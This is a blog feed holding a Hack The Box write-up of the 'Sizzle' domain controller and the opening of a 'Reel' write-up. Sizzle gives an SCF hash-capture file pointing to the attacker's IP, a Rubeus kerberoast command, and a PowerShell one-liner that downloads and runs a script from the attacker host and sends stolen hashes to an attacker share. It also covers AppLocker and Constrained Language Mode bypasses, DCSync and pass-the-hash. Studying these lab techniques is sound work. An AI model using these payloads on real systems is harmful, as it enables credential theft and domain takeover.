<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-05-02T22:12:27+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">Sizzle</title><link href="https://omnisl4sh.github.io/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="Sizzle" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/02/Sizzle</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/02/Sizzle.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>Windows Domain Controller</strong> machine. We find an <strong>SMB share</strong> containing a <em>writable</em> folder called <code class="language-plaintext highlighter-rouge">Public</code>. We place an <code class="language-plaintext highlighter-rouge">SCF</code> file there that <em>directs the visiting user’s computer</em> to our listening <code class="language-plaintext highlighter-rouge">responder</code> where we capture his <code class="language-plaintext highlighter-rouge">NTLMv2</code> hash.</li>
  <li><em>After cracking it,</em> we get the password for the <code class="language-plaintext highlighter-rouge">amanda</code> user which we use to enumerate the domain using <code class="language-plaintext highlighter-rouge">BloodHound</code>.</li>
  <li><em>Noticing that our user has</em> <strong>PowerShell Remoting</strong> <em>capabilities,</em> we try to gain access but are faced with a <em>strange authentication error</em>.</li>
  <li><em>Upon inspecting the functionality of the</em> <code class="language-plaintext highlighter-rouge">Evil-Winrm</code> <em>tool,</em> we find that we can use a <em>certificate</em> for logging in.</li>
  <li>We create a <strong>Certificate Signing Request</strong> using <code class="language-plaintext highlighter-rouge">openssl</code> and get it signed from the <strong>ADCS Web Interface</strong> found on the domain controller.</li>
  <li><em>Using</em> <code class="language-plaintext highlighter-rouge">evil-winrm</code>‘<em>s ability to authenticate using SSL certificates,</em> we successfully achieve code execution.</li>
  <li>Looking back at the output of <code class="language-plaintext highlighter-rouge">BloodHound</code> showed a <em>kerberoastable</em> user called <code class="language-plaintext highlighter-rouge">mrlky</code> that has dangerous rights abusable for a <code class="language-plaintext highlighter-rouge">DCSync</code> attack.</li>
  <li>We decide to use <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> to do the job but can’t execute it due to <strong>Applocker</strong> restrictions.</li>
  <li>We bypass by moving it to the Windows <code class="language-plaintext highlighter-rouge">temp</code> folder and are faced with another error requiring us to authenticate to the network.</li>
  <li>We add the <code class="language-plaintext highlighter-rouge">amanda</code>’s credentials as flags to the <code class="language-plaintext highlighter-rouge">Rubeus</code> tool and manage to kerberoast <code class="language-plaintext highlighter-rouge">mrkly</code>.</li>
  <li>We crack his <code class="language-plaintext highlighter-rouge">TGS</code> hash and are able to get the password. We then proceed to <code class="language-plaintext highlighter-rouge">DCSync</code> and obtain the <code class="language-plaintext highlighter-rouge">NTLM hash</code> for the <code class="language-plaintext highlighter-rouge">administrator</code> account and <code class="language-plaintext highlighter-rouge">PTH</code> to gain complete access.</li>
  <li>Bonus: Bypassing <strong>PowerShell Contrained Language Mode</strong>, dodging <strong>Applocker</strong>, <strong>authenticating</strong> to the network and <strong>Kerberoasting</strong> all in a <strong>one-liner</strong> and <em>without touching disk</em>.</li>
  <li>Joke Section: Pwning the box with <strong>ZeroLogon</strong> XD</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>The nmap output gives some good information:</p>
<ul>
  <li><strong>Machine Name:</strong> Sizzle</li>
  <li><strong>Domain Name:</strong> HTB.local</li>
  <li><strong>FTP</strong> with <em>anonymous</em> login allowed</li>
  <li><strong>IIS</strong> 10.0 on port 80 which indicates server 2016+ or windows 10</li>
  <li><strong>SMB</strong> on port 445</li>
  <li><strong>LDAP</strong> and <strong>GC</strong> on ports 389 and 3268</li>
  <li><strong>WinRM</strong> on 5985/5986 which is always nice to have</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-04-30T19:55:42
|_  start_date: 2022-04-30T19:49:45
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
</code></pre></div></div>

<h3 id="anonymous-ftp">Anonymous FTP</h3>
<p>No files were there, and we’re not granted <code class="language-plaintext highlighter-rouge">write</code> access either. So we move on.</p>

<p><img src="/assets/Sizzle/Anon-FTP-no-write.jpg" alt="Anon-FTP-no-write" /></p>

<h3 id="httphttps">HTTP/HTTPs</h3>
<p>The home page just shows a <code class="language-plaintext highlighter-rouge">GIF</code> of bacon sizzling…</p>

<p><img src="/assets/Sizzle/http-homepage.jpg" alt="http-homepage" /></p>

<p>Spidering with <code class="language-plaintext highlighter-rouge">gobuster</code> shows an interesting directory <code class="language-plaintext highlighter-rouge">/certsrv</code> which indicates that the <strong>ADCS role</strong> is installed on this server. We note this down.</p>

<p><img src="/assets/Sizzle/gobuser-output.jpg" alt="gobuser-output" /></p>

<p>the <strong>HTTPS</strong> website is similar in structure. so we move along.</p>

<h3 id="ldap">LDAP</h3>
<p>The output of <code class="language-plaintext highlighter-rouge">ldapsearch</code> didn’t show much information.</p>

<p><img src="/assets/Sizzle/ldapsearch-output.jpg" alt="ldapsearch-output" /></p>

<p>(<em>I grepped out some unnecessary lines from the output to make it smaller.</em>)</p>

<h3 id="smb">SMB</h3>
<p>Enumerating SMB with <code class="language-plaintext highlighter-rouge">crackmapexec</code> reveals that we have <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">Department Shares</code> folder.</p>

<p><img src="/assets/Sizzle/cme-smb-share-enum.jpg" alt="cme-smb-share-enum" /></p>

<p><em>After mounting it,</em> we notice a couple of folders:</p>

<p><img src="/assets/Sizzle/dpt-shares-folders.jpg" alt="dpt-shares-folders" /></p>

<p>the <code class="language-plaintext highlighter-rouge">Users</code> folder contained some usernames which we save in a list for later use:</p>

<p><img src="/assets/Sizzle/userlist-from-smb.jpg" alt="userlist-from-smb" /></p>

<p>We find some files in the <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folder but they dont have any content:</p>

<p><img src="/assets/Sizzle/zz-archive-files.jpg" alt="zz-archive-files" /></p>

<p>we loop over the files using the <code class="language-plaintext highlighter-rouge">file</code> command and <code class="language-plaintext highlighter-rouge">grep</code> out any empty hex line with <code class="language-plaintext highlighter-rouge">xxd</code> to find nothing there as well.</p>

<p><img src="/assets/Sizzle/checking_zz_archive.jpg" alt="checking_zz_archive" /></p>

<p><em>Since we were nearing a dead end with our enumeration,</em> we’re going to use a simple <code class="language-plaintext highlighter-rouge">bash</code> script to check for <code class="language-plaintext highlighter-rouge">write</code> access in the SMB share.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
list=$(find /mnt -type d)
for d in $list
do
        touch $d/just-a-test-dir 2&gt;/dev/null
        if [ $? -eq 0 ]
        then
                echo -e "\e[32m[+] $d is writable\e[0m"
                rm $d/just-a-test-dir
        else
                echo -e "\e[31m[-] $d is not writable\e[0m"
        fi
done
</code></pre></div></div>

<ol>
  <li>it does a <code class="language-plaintext highlighter-rouge">find</code> on the mount point with the <code class="language-plaintext highlighter-rouge">-type d</code> flag to get <em>only directories</em>.</li>
  <li>then attempts to create a file in each one using <code class="language-plaintext highlighter-rouge">touch</code></li>
  <li>It prints out if the folder is writable or not</li>
  <li>then clears the test file if the folder is writable.</li>
</ol>

<p><img src="/assets/Sizzle/check-write-script-results.jpg" alt="check-write-script-results" /></p>

<p>The results show that we have <code class="language-plaintext highlighter-rouge">write</code> access in both the <code class="language-plaintext highlighter-rouge">Public</code> and <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folders.</p>

<p>Having this access would allow us to <em>plant a malicious type of file</em> that would enable us to <em>steal</em> <strong>NTLMv2 hashes</strong> from users who access these locations.</p>

<h3 id="scf-file-attacks-for-hash-theft">SCF File Attacks for Hash Theft</h3>
<p>SCF (Shell Command Files) are files that can perform actions in <strong>Windows Explorer</strong>. One functionality can be <em>abused</em> to have the <em>share-visiting</em> user <em>directed</em> to our kali machine.</p>

<p>This can be done using a file with the below content:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
Command=2
IconFile=\\10.10.16.7\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
</code></pre></div></div>

<p><em>Essentially,</em> this tells <strong>File Explorer</strong> to <em>fetch</em> the icon for the <code class="language-plaintext highlighter-rouge">.scf</code> file from a network share (<em>our kali box in this case</em>).</p>

<p>We’re going to fire up <code class="language-plaintext highlighter-rouge">responder</code> making sure the <code class="language-plaintext highlighter-rouge">Responder.conf</code> file has the <code class="language-plaintext highlighter-rouge">SMB</code> server set to <code class="language-plaintext highlighter-rouge">ON</code>.</p>

<p>And then copy the <code class="language-plaintext highlighter-rouge">.scf</code> file to <code class="language-plaintext highlighter-rouge">\\10.10.10.103\Department Shares\Users\Public</code> as well as the <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folders to make sure any visitor gives us his/her hash.</p>

<p><img src="/assets/Sizzle/amanda-hash-captured.jpg" alt="amanda-hash-captured" /></p>

<p>We manage to get a response from the <code class="language-plaintext highlighter-rouge">amanda</code> user right away :D</p>

<p>We then get to cracking with <code class="language-plaintext highlighter-rouge">john</code></p>

<p><img src="/assets/Sizzle/amanda-hash-cracked.jpg" alt="amanda-hash-cracked" /></p>

<p>the password turns out to be <code class="language-plaintext highlighter-rouge">Ashare1972</code></p>

<h3 id="the-winrm-situation">The WinRM situation</h3>
<p>We first validate the creds for <code class="language-plaintext highlighter-rouge">amanda</code> with <code class="language-plaintext highlighter-rouge">crackmapexec</code> via SMB and they work.</p>

<p>So we try WinRM after but end up with a weird error message:</p>

<p><img src="/assets/Sizzle/cme-smb-yes-winrm-no.jpg" alt="cme-smb-yes-winrm-no" /></p>

<p>at this moment, I wasn’t quite sure what to do. So I moved on to try other things.</p>

<h3 id="domain-enumeration-with-bloodhoundpy">Domain Enumeration With BloodHound.py</h3>
<p><em>Since I didn’t have code execution,</em> I turned to the <strong>Python</strong> version of <code class="language-plaintext highlighter-rouge">BloodHound</code> to do enumeration with all collection methods:</p>

<p><img src="/assets/Sizzle/bloodhound-py.jpg" alt="bloodhound-py" /></p>

<p><em>Viewing the</em> <code class="language-plaintext highlighter-rouge">amanda</code> <em>user,</em> I saw she did have <strong>PowerShell Remoting</strong> capability when I ran the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principles</code> query.</p>

<p><img src="/assets/Sizzle/amanda-can-ps-remote.jpg" alt="amanda-can-ps-remote" /></p>

<h3 id="getting-winrm-to-work">Getting WinRM to work</h3>
<p><em>Since we have access to the</em> <code class="language-plaintext highlighter-rouge">amanda</code> <em>user’s credentials,</em> we can <em>request</em> a <strong>User Certificate</strong> from <strong>AD Certificate Services.</strong></p>

<p>This can be done after authenticating to <code class="language-plaintext highlighter-rouge">http://10.10.10.103/certsrv</code> and submitting a <strong>Certificate Signing Request</strong> (<strong>CSR</strong> for short).</p>

<p><em>Before visiting the</em> <strong>ADCS</strong> <em>page,</em> we would need to get a <strong>key</strong> and a <strong>CSR</strong>. This can be done using <code class="language-plaintext highlighter-rouge">openssl</code>.</p>

<p>The command should be as below:</p>

<p><code class="language-plaintext highlighter-rouge">openssl req -newkey rsa:2048 -keyout amanda.key -out amanda.csr</code></p>

<p><img src="/assets/Sizzle/gen-key-gen-csr.jpg" alt="gen-key-gen-csr" /></p>

<p>Note the contents of the <code class="language-plaintext highlighter-rouge">.csr</code> file:</p>

<p><img src="/assets/Sizzle/amanda-csr.jpg" alt="amanda-csr" /></p>

<p>We now visit the page:</p>

<p><img src="/assets/Sizzle/cert-srv-1.jpg" alt="cert-srv-1" /></p>

<p><img src="/assets/Sizzle/cert-srv-2.jpg" alt="cert-srv-2" /></p>

<p>we then paste what we copied from <code class="language-plaintext highlighter-rouge">amanda.csr</code></p>

<p><img src="/assets/Sizzle/cert-srv-3.jpg" alt="cert-srv-3" /></p>

<p>And we select the <strong>Base 64 encoded version</strong> and download it.</p>

<p><img src="/assets/Sizzle/cert-srv-4.jpg" alt="cert-srv-4" /></p>

<p><em>Having done all this,</em> we just need to hook both the <code class="language-plaintext highlighter-rouge">.key</code> file and the <code class="language-plaintext highlighter-rouge">.cer</code> we got from <strong>ADCS</strong> to <code class="language-plaintext highlighter-rouge">evil-winrm</code> while using the <code class="language-plaintext highlighter-rouge">-S</code> flag for SSL.</p>

<p>We know so from checking the help:</p>

<p><img src="/assets/Sizzle/evil-winrm-help.jpg" alt="evil-winrm-help" /></p>

<p>And it works like a charm :D</p>

<p><img src="/assets/Sizzle/winrm-success-amanda.jpg" alt="winrm-success-amanda" /></p>

<p>Note: the PEM pass phrase is the one you were asked to enter when generating the private key and CSR with <code class="language-plaintext highlighter-rouge">openssl</code></p>

<h3 id="back-to-bloodhound-graphs-kerberoastable-users">Back to <code class="language-plaintext highlighter-rouge">BloodHound</code> graphs: Kerberoastable Users</h3>
<p>Inspecting the query <code class="language-plaintext highlighter-rouge">List all Kerberoastable Accounts</code> shows us that a user called <code class="language-plaintext highlighter-rouge">mrlky</code> is vulnerable.</p>

<p><img src="/assets/Sizzle/mrlky-kerberoastable.jpg" alt="mrlky-kerberoastable" /></p>

<p>That user is very special since he has the 2 required rights to perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack:</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">GetChanges</code></li>
  <li><code class="language-plaintext highlighter-rouge">GetChangesAll</code></li>
</ol>

<p><img src="/assets/Sizzle/mrlky-can-dcsync.jpg" alt="mrlky-can-dcsync" /></p>

<p><em>Hence,</em> we need to kerberoast this guy and get his TGS hash :D</p>

<h3 id="roasting-with-rubeus-bypassing-applocker-and-performing-network-authentication">Roasting with Rubeus: Bypassing Applocker and Performing Network Authentication</h3>
<p><em>After copying</em> <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> <em>from our kali machine over to</em> <code class="language-plaintext highlighter-rouge">amanda</code>‘<em>s documents folder</em>, we find that we can’t execute due to <strong>Applocker.</strong></p>

<p><img src="/assets/Sizzle/rubeus-applocked.jpg" alt="rubeus-applocked" /></p>

<p>Moving it to <code class="language-plaintext highlighter-rouge">c:\windows\temp</code> directory works as a bypass. But we get another error:</p>

<p><img src="/assets/Sizzle/rubeus-no-net-logon.jpg" alt="rubeus-no-net-logon" /></p>

<p>This is because we logged in using a different way: user certificate.</p>

<p><em>In order to carry out this attack,</em> we would need to authenticate to the network.</p>

<p>This can be done using the <code class="language-plaintext highlighter-rouge">/creduser</code>, <code class="language-plaintext highlighter-rouge">/credpassword</code> and <code class="language-plaintext highlighter-rouge">/domain</code> switches in <code class="language-plaintext highlighter-rouge">Rubeus.exe</code>.</p>

<p>The command is: <code class="language-plaintext highlighter-rouge">.\rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /domain:htb.local</code></p>

<p><img src="/assets/Sizzle/mrlky-kerberoasted.jpg" alt="mrlky-kerberoasted" /></p>

<p>We’re good! :D</p>

<p>Now we crack the hash for <code class="language-plaintext highlighter-rouge">mrkly</code> again with <code class="language-plaintext highlighter-rouge">john</code>:</p>

<p><img src="/assets/Sizzle/mrlky-cracked.jpg" alt="mrlky-cracked" /></p>

<h3 id="dcsync">DCSync</h3>
<p><em>Having the password for</em> <code class="language-plaintext highlighter-rouge">mrkly</code>: <code class="language-plaintext highlighter-rouge">Football#7</code>, we’re going to use <code class="language-plaintext highlighter-rouge">Impacket</code>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> python script to do a <code class="language-plaintext highlighter-rouge">DCSync</code> attack:</p>

<p><img src="/assets/Sizzle/dcsynced.jpg" alt="dcsynced" /></p>

<p>and follow up with <code class="language-plaintext highlighter-rouge">psexec.py</code> for a quick <strong>Pass-The-Hash</strong> attack to get code execution as <code class="language-plaintext highlighter-rouge">NT Authority\System</code>:</p>

<p><img src="/assets/Sizzle/got-system.jpg" alt="got-system" /></p>

<h3 id="bonus-powershell-contrained-language-mode-bypassing-it-along-with-applocker-and-kerberoasting-without-touching-disk-all-in-a-powershell-one-liner-d">Bonus: PowerShell Contrained Language Mode, Bypassing it along with Applocker and Kerberoasting without touching disk. All in a PowerShell one-liner :D</h3>
<p>After I initially got the WinRM shell, It kept asking for my PEM pass phrase after each command.</p>

<p>I wanted to get a <code class="language-plaintext highlighter-rouge">nishang</code> shell but couldn’t do the <code class="language-plaintext highlighter-rouge">IEX</code> command (<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>). This was because of <strong>PowerShell’s Contrained Language Mode</strong>.</p>

<p><img src="/assets/Sizzle/constrained-language-mode.jpg" alt="constrained-language-mode" /></p>

<p><strong>Contrained Language Mode</strong> disables a few PowerShell commands that can be dangerous.</p>

<p><em>Fortunately,</em> it can be bypassed by <em>downgrading</em> to <strong>PowerShell</strong> version 2.</p>

<p>We’re going to be abusing the <code class="language-plaintext highlighter-rouge">Start-Process</code> command to start a <code class="language-plaintext highlighter-rouge">powershell.exe</code> with <code class="language-plaintext highlighter-rouge">-v 2</code> and the command <code class="language-plaintext highlighter-rouge">-c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/Invoke-Kerberoast.ps1')</code> as arguments.</p>

<p>This is to:</p>
<ol>
  <li>Start a <strong>PowerShell</strong> version 2 process without locking the terminal.</li>
  <li>Import the <code class="language-plaintext highlighter-rouge">Invoke-Kerberoast</code> code into memory.</li>
  <li>Execute the command <code class="language-plaintext highlighter-rouge">Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt</code>.</li>
  <li>Output the TGS hash of the <code class="language-plaintext highlighter-rouge">mrlky</code> user to our SMB share.</li>
</ol>

<p>we will use the <code class="language-plaintext highlighter-rouge">-Credential</code> paramer with <code class="language-plaintext highlighter-rouge">Start-Process</code> to create the Network Authentication needed for the attack to succeed.</p>

<p><em>That way,</em> we’ve hit multiple birds with one stone.</p>
<ol>
  <li>We never had to deal with <strong>Applocker</strong></li>
  <li>Dodged <strong>Contrained Language Mode</strong></li>
  <li>Created the needed <strong>Network Logon</strong></li>
  <li><strong>Kerberoasted</strong> <em>without ever touching the victim’s disk</em></li>
</ol>

<p><img src="/assets/Sizzle/bonus-kill.jpg" alt="bonus-kill" /></p>

<h3 id="joke-section-pwning-the-box-with-zerologon-xd">Joke Section: Pwning the box with <code class="language-plaintext highlighter-rouge">ZeroLogon</code> XD</h3>

<p>You could do all of the above.</p>

<p>OR…</p>

<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Windows Domain Controller machine. We find an SMB share containing a writable folder called Public. We place an SCF file there that directs the visiting user’s computer to our listening responder where we capture his NTLMv2 hash. After cracking it, we get the password for the amanda user which we use to enumerate the domain using BloodHound. Noticing that our user has PowerShell Remoting capabilities, we try to gain access but are faced with a strange authentication error. Upon inspecting the functionality of the Evil-Winrm tool, we find that we can use a certificate for logging in. We create a Certificate Signing Request using openssl and get it signed from the ADCS Web Interface found on the domain controller. Using evil-winrm‘s ability to authenticate using SSL certificates, we successfully achieve code execution. Looking back at the output of BloodHound showed a kerberoastable user called mrlky that has dangerous rights abusable for a DCSync attack. We decide to use Rubeus.exe to do the job but can’t execute it due to Applocker restrictions. We bypass by moving it to the Windows temp folder and are faced with another error requiring us to authenticate to the network. We add the amanda’s credentials as flags to the Rubeus tool and manage to kerberoast mrkly. We crack his TGS hash and are able to get the password. We then proceed to DCSync and obtain the NTLM hash for the administrator account and PTH to gain complete access. Bonus: Bypassing PowerShell Contrained Language Mode, dodging Applocker, authenticating to the network and Kerberoasting all in a one-liner and without touching disk. Joke Section: Pwning the box with ZeroLogon XD]]></summary></entry><entry><title type="html">Reel</title><link href="https://omnisl4sh.github.io/2022/04/30/Reel.html" rel="alternate" type="text/html" title="Reel" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/30/Reel</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/30/Reel.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>windows machine</strong> with <code class="language-plaintext highlighter-rouge">Anonymous FTP</code> allowed. <em>Inspecting the contents</em> reveals a <strong>documents folder</strong> one of which tells us that <em>RTF documents are being reviewed and converted by someone</em>.</li>
  <li><em>Using this information,</em> we craft a <em>malicious document</em> using <strong>CVE-2017-0199</strong> and send it to a certain user called <code class="language-plaintext highlighter-rouge">nico</code> via the open <code class="language-plaintext highlighter-rouge">SMTP</code> port (<em>We find his username by checking the metadata of the documents on FTP</em>).</li>
  <li><em>When the document is opened,</em> we get a shell back as <code class="language-plaintext highlighter-rouge">nico</code> and start enumerating the machine.</li>
  <li><em>With BloodHound,</em> we find that nico has a <code class="language-plaintext highlighter-rouge">WriteOwner</code> right over another user <code class="language-plaintext highlighter-rouge">herman</code> who has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> over a certain group called <code class="language-plaintext highlighter-rouge">Backup_Admins</code>.</li>
  <li>We abuse the <code class="language-plaintext highlighter-rouge">WriteOwner</code> right to grant ourselves the right to reset <code class="language-plaintext highlighter-rouge">herman</code>’s password and abuse the <code class="language-plaintext highlighter-rouge">WriteDACL</code> to add him to the <code class="language-plaintext highlighter-rouge">Backup_Admins</code> group.</li>
  <li>We then find out that <code class="language-plaintext highlighter-rouge">Backup_Admins</code> have access to a certain folder called <code class="language-plaintext highlighter-rouge">Backup Scripts</code> on the <code class="language-plaintext highlighter-rouge">Administrator</code>’s desktop on the box.</li>
  <li><em>Within that folder,</em> we find a script that contains the password for the local administrator which works and we use it to login using the open <code class="language-plaintext highlighter-rouge">SSH</code> port.</li>
  <li>A <em>Similar path</em> exists with another user <code class="language-plaintext highlighter-rouge">tom</code> whom his credentials are present in a <code class="language-plaintext highlighter-rouge">creds.xml</code> file on <code class="language-plaintext highlighter-rouge">nico</code>’s desktop as a <code class="language-plaintext highlighter-rouge">secure string</code>.</li>
  <li>The clear-text credentials can be retrieved to gain access as <code class="language-plaintext highlighter-rouge">tom</code> using <code class="language-plaintext highlighter-rouge">SSH</code>. <code class="language-plaintext highlighter-rouge">tom</code> has <code class="language-plaintext highlighter-rouge">WriteOwner</code> on <code class="language-plaintext highlighter-rouge">claire</code> who has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> on <code class="language-plaintext highlighter-rouge">Backup_Admins</code>.</li>
  <li>Another path exists with abusing the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> held by <code class="language-plaintext highlighter-rouge">tom</code> since he’s a member of the <code class="language-plaintext highlighter-rouge">Print Operators</code> group.</li>
  <li>The box is also vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2018-8440</code> and <code class="language-plaintext highlighter-rouge">CVE-2019-1458</code> local privilege escalation exploits.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p><em>Looking at the</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>scan,</em> we find very few ports running:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION                                                                                      
21/tcp open  ftp     Microsoft ftpd                                                                               
| ftp-syst:                                                                                                       
|_  SYST: Windows_NT                                                                                              
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                            
|_05-29-18  12:19AM       &lt;DIR&gt;          documents                                                                
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)                                                                   
| ssh-hostkey:                                                                                                    
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)            
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)           
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)         
25/tcp open  smtp?                                                                                                
| fingerprint-strings:                                                                                            
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready                                                                                      
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready                                                                                      
|     sequence of commands                                                                                        
|     sequence of commands                                                                                        
|   Hello:                                                                                                        
|     220 Mail Service ready                                                                                      
|     EHLO Invalid domain address.                                                                                
|   Help:                                                                                                         
|     220 Mail Service ready                                                                                      
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY              
|   SIPOptions:                                                                                                   
|     220 Mail Service ready                                                                                      
|     sequence of commands                                                                                        
|     sequence of commands
|     sequence of commands                              
|     sequence of commands
|     sequence of commands                                                                                        
|     sequence of commands                                                                                        
|     sequence of commands
|     sequence of commands                    
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</code></pre></div></div>

<h3 id="anonymous-ftp">Anonymous FTP</h3>
<p><em>Checking</em> <strong>FTP</strong>, we come across 3 files:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">Applocker.docx</code></li>
  <li><code class="language-plaintext highlighter-rouge">readme.txt</code></li>
